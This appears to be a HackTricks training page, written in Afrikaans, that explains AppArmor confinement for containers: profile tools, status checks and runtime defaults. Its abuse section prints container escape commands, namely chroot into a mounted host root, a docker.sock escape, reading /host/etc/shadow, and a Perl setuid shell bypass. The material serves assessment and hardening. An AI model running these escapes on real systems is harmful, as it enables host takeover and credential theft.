# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## Oorsig

AppArmor is 'n **Mandatory Access Control** stelsel wat beperkings toepas deur per-program-profiele. Anders as tradisionele DAC-checks, wat swaar afhanklik is van gebruiker- en groepseienaarskap, laat AppArmor die kernel 'n beleid afdwing wat aan die proses self gekoppel is. In container-omgewings maak dit saak omdat 'n workload dalk genoeg tradisionele voorregte het om 'n aksie te probeer en steeds geweier kan word omdat sy AppArmor-profiel nie die betrokke path, mount, netwerkgedrag, of gebruik van capabilities toelaat nie.

## Rol in container-isolasie

Container-sekuriteitsbeoordelings stop dikwels by capabilities en seccomp, maar AppArmor bly belangrik ná daardie kontroles. Stel jou 'n container voor wat meer voorregte het as wat dit behoort te hê, of 'n workload wat vir bedryfsredes een ekstra capability nodig gehad het. AppArmor kan steeds lêertoegang, mount-gedrag, netwerking en uitvoeringspatrone beperk op maniere wat die voor die hand liggende misbruikpad stop. Dit is waarom die deaktivering van AppArmor "just to get the application working" stilweg 'n bloot riskante konfigurasie in een kan omskep wat aktief uitgebuit kan word.

## Laboratorium

Om te kontroleer of AppArmor op die host aktief is, gebruik:
```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```
Om te sien waaronder die huidige container process loop:
```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```
Die verskil is insiggewend. In die normale geval moet die proses 'n AppArmor-context wys wat gekoppel is aan die profiel wat deur die runtime gekies is. In die unconfined-geval verdwyn daardie ekstra beperkingslaag.

Jy kan ook inspekteer wat Docker dink dit toegepas het:
```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```
## Runtime Gebruik

Docker kan 'n standaard of pasgemaakte AppArmor-profiel toepas wanneer die gasheer dit ondersteun. Podman kan ook integreer met AppArmor op AppArmor-gebaseerde stelsels, alhoewel op SELinux-eerste distribusies die ander MAC-stelsel dikwels die aandag trek. Kubernetes kan AppArmor-beleid op die workload-vlak blootstel op nodes wat werklik AppArmor ondersteun. LXC en verwante Ubuntu-familie stelsel-container-omgewings gebruik AppArmor ook wyd.

Die praktiese punt is dat AppArmor nie 'n "Docker feature" is nie. Dit is 'n gasheer-kern funksie wat verskeie runtimes kan kies om toe te pas. As die gasheer dit nie ondersteun nie of die runtime gesê word om unconfined te loop, is die veronderstelde beskerming nie regtig daar nie.

Op Docker-geschikte AppArmor-gasheers is die bekendste standaard `docker-default`. Daardie profiel word gegenereer vanaf Moby se AppArmor-sjabloon en is belangrik omdat dit verduidelik waarom sommige capability-gebaseerde PoCs steeds in 'n standaard kontainer misluk. In breë terme laat `docker-default` gewone netwerking toe, weier skryfbevoegdhede tot groot dele van `/proc`, weier toegang tot sensitiewe dele van `/sys`, blokkeer mount-operasies, en beperk ptrace sodat dit nie 'n algemene gasheer-probeer-primitive is nie. Om daardie basislyn te verstaan help om te onderskei tussen "die kontainer het `CAP_SYS_ADMIN`" en "die kontainer kan daardie capability werklik teen die kernel-koppelvlakke wat ek omgee gebruik".

## Profielbestuur

AppArmor-profiele word gewoonlik gestoor onder `/etc/apparmor.d/`. 'n Algemene benoemingskonvensie is om skuinsstrepies in die uitvoerbare pad met kolletjies te vervang. Byvoorbeeld, 'n profiel vir `/usr/bin/man` word algemeen gestoor as `/etc/apparmor.d/usr.bin.man`. Hierdie detail maak saak tydens beide verdediging en assessering omdat sodra jy die aktiewe profielnaam ken, jy dikwels die ooreenstemmende lêer vinnig op die gasheer kan opspoor.

Nuttige gasheer-geside bestuur-opdragte sluit in:
```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```
Die rede waarom hierdie opdragte saakmaak in 'n container-security verwysing is dat hulle verduidelik hoe profiele werklik opgebou, gelaai, na klaagmodus geskuif en gewysig word na toepassingsveranderinge. As 'n operateur die gewoonte het om profiele tydens foutopsporing na klaagmodus te skuif en vergeet om afdwinging te herstel, kan die container in dokumentasie beskerm lyk terwyl dit in werklikheid baie losser optree.

### Bou en Bywerk Profiele

`aa-genprof` kan toepassingsgedrag observeer en help om 'n profiel interaktief te genereer:
```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```
`aa-easyprof` kan 'n sjabloonprofiel genereer wat later met `apparmor_parser` gelaai kan word:
```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```
Wanneer die binêre verander en die beleid bygewerk moet word, kan `aa-logprof` weierings wat in logs gevind is, herhaal en die operateur help om te besluit of om hulle toe te laat of te weier:
```bash
sudo aa-logprof
```
### Logs

AppArmor-weierings is dikwels sigbaar via `auditd`, syslog, of gereedskap soos `aa-notify`:
```bash
sudo aa-notify -s 1 -v
```
Dit is nuttig operasioneel en offensief. Verdedigers gebruik dit om profiles te verfyn. Aanvallers gebruik dit om te leer watter presiese pad of operasie geweier word en of AppArmor die beheer is wat 'n exploit chain blokkeer.

### Identifisering van die presiese Profile File

Wanneer 'n runtime 'n spesifieke AppArmor profile name vir 'n container wys, is dit dikwels nuttig om daardie naam terug te koppel na die profile file op skyf:
```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```
Dit is veral nuttig tydens host-side hersiening omdat dit die gaping oorbrug tussen "die container sê dit loop onder profiel `lowpriv`" en "die werklike reëls is in hierdie spesifieke lêer wat geoudit of herlaai kan word".

## Konfigurasiefoute

Die mees voor die hand liggende fout is `apparmor=unconfined`. Administrateurs stel dit dikwels terwyl hulle 'n toepassing debug wat misluk het omdat die profiel korrek iets gevaarliks of onverwagts geblokkeer het. As die vlag in produksie bly, is die hele MAC-laag effektief verwyder.

Nog 'n subtiele probleem is om aan te neem dat bind mounts onskadelik is omdat die lêertoestemmings normaal lyk. Aangesien AppArmor padgebaseer is, kan die blootstelling van host paths onder alternatiewe mount locations sleg met padreëls wisselwerking hê. 'n Derde fout is om te vergeet dat 'n profielnaam in 'n konfigurasielêer min beteken as die host-kern AppArmor nie werklik afdwing nie.

## Misbruik

Wanneer AppArmor weg is, kan bedrywighede wat voorheen beperk was skielik werk: lees van sensitiewe paths deur bind mounts, toegang tot dele van procfs of sysfs wat moeiliker moes bly om te gebruik, uitvoer van mount-verwante aksies as capabilities/seccomp dit ook toelaat, of die gebruik van paths wat 'n profiel normaalweg sou weier. AppArmor is dikwels die meganisme wat verklaar waarom 'n capability-based breakout attempt "should work" on paper but still fails in practice. Verwyder AppArmor, en dieselfde poging kan begin slaag.

As jy vermoed AppArmor is die hoofrede dat 'n path-traversal, bind-mount, of mount-based abuse chain gestop word, is die eerste stap gewoonlik om te vergelyk wat met en sonder 'n profiel toeganklik raak. Byvoorbeeld, as 'n host path binne die container gemount is, begin deur te kontroleer of jy dit kan deurloop en lees:
```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```
As die container ook ’n gevaarlike bevoegdheid soos `CAP_SYS_ADMIN` het, is een van die mees praktiese toetse om te bepaal of AppArmor die beheer is wat mount-operasies of toegang tot sensitiewe kernel-lêerstelsels blokkeer:
```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```
In omgewings waar 'n host path' reeds via 'n bind mount' beskikbaar is, kan die verlies van AppArmor ook 'n read-only information-disclosure-kwessie omskakel in direkte toegang tot host-lêers:
```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```
Die punt van hierdie opdragte is nie dat AppArmor alleen die uitbraak veroorsaak nie. Dit is dat sodra AppArmor verwyder is, baie filesystem- en mount-based abuse paths onmiddellik toetsbaar raak.

### Volledige voorbeeld: AppArmor gedeaktiveer + Host root gemount

As die container reeds die host root bind-mounted by `/host` het, kan die verwydering van AppArmor 'n geblokkeerde filesystem abuse path in 'n volledige host escape omskep:
```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Sodra die shell deur die gasheer-lêerstelsel uitgevoer word, het die werklas effektief die houergrens ontsnap:
```bash
id
hostname
cat /etc/shadow | head
```
### Volledige Voorbeeld: AppArmor Gedeaktiveer + Runtime Socket

As die werklike versperring AppArmor rondom die runtime-toestand was, kan 'n gemonteerde socket genoeg wees vir 'n volledige ontsnapping:
```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Die presiese pad hang af van die mountpunt, maar die eindresultaat is dieselfde: AppArmor voorkom nie meer toegang tot die runtime API nie, en die runtime API kan 'n container lanseer wat die gasheer kan kompromitteer.

### Full Example: Path-Based Bind-Mount Bypass

Omdat AppArmor padgebaseerd is, beskerm die beskerming van `/proc/**` nie outomaties dieselfde host procfs-inhoud as dit deur 'n ander pad bereikbaar is nie:
```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```
Die impak hang af van wat presies gemount is en of die alternatiewe pad ook ander kontroles omseil, maar hierdie patroon is een van die duidelikste redes waarom AppArmor saam met die mount-opstelling eerder as geïsoleerd geëvalueer moet word.

### Volledige Voorbeeld: Shebang Bypass

AppArmor-beleid mik soms op 'n interpreterpad op 'n wyse wat nie ten volle rekening hou met skripuitvoering deur shebang-hantering nie.

'n Historiese voorbeeld het behels die gebruik van 'n skrip waarvan die eerste reël na 'n gekonfineeerde interpreter verwys:
```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```
So 'n voorbeeld is belangrik as 'n herinnering dat die bedoeling van 'n profiel en die werklike uitvoeringssemantiek kan uiteenloop. Wanneer AppArmor in container-omgewings beoordeel word, verdien interpreterkettings en alternatiewe uitvoeringspaaie besondere aandag.

## Checks

Die doel van hierdie kontroles is om vinnig drie vrae te beantwoord: is AppArmor op die host geaktiveer, is die huidige proses beperk, en het die runtime inderdaad 'n profiel op hierdie container toegepas?
```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
```
Wat hier interessant is:

- As `/proc/self/attr/current` `unconfined` wys, benut die workload nie voordeel van AppArmor-beperking nie.
- As `aa-status` AppArmor gedeaktiveer of nie gelaai wys nie, is enige profielnaam in die runtime-konfigurasie meestal kosmeties.
- As `docker inspect` `unconfined` of 'n onverwagte pasgemaakte profiel wys, is dit dikwels die rede waarom 'n lêerstelsel- of mount-gebaseerde misbruikpad werk.

As 'n container reeds verhoogde regte het vir operasionele redes, maak dit om AppArmor aangeskakel te laat dikwels die verskil tussen 'n beheerde uitsondering en 'n baie breër sekuriteitsfout.

## Standaardinstellings vir runtime

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | By verstek geaktiveer op hosts wat AppArmor ondersteun | Gebruik die `docker-default` AppArmor-profiel tensy dit oorskryf word | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | Host-afhanklik | AppArmor word deur `--security-opt` ondersteun, maar die presiese verstek hang van die host/runtime af en is minder universeel as Docker se gedokumenteerde `docker-default` profiel | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | Voorwaardelike verstek | As `appArmorProfile.type` nie gespesifiseer is nie, is die verstek `RuntimeDefault`, maar dit word slegs toegepas wanneer AppArmor op die node geaktiveer is | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` met 'n swak profiel; nodes sonder AppArmor-ondersteuning |
| containerd / CRI-O under Kubernetes | Volg node/runtime-ondersteuning | Algemene Kubernetes-ondersteunde runtimes ondersteun AppArmor, maar werklike afdwinging hang steeds af van node-ondersteuning en workload-instellings | Soos in die Kubernetes-ry; direkte runtime-konfigurasie kan AppArmor heeltemal oorslaan |

Vir AppArmor is die belangrikste veranderlike dikwels die **host**, nie net die runtime nie. 'n Profielinstelling in 'n manifest skep nie konfinesering op 'n node waar AppArmor nie geaktiveer is nie.
{{#include ../../../../banners/hacktricks-training.md}}
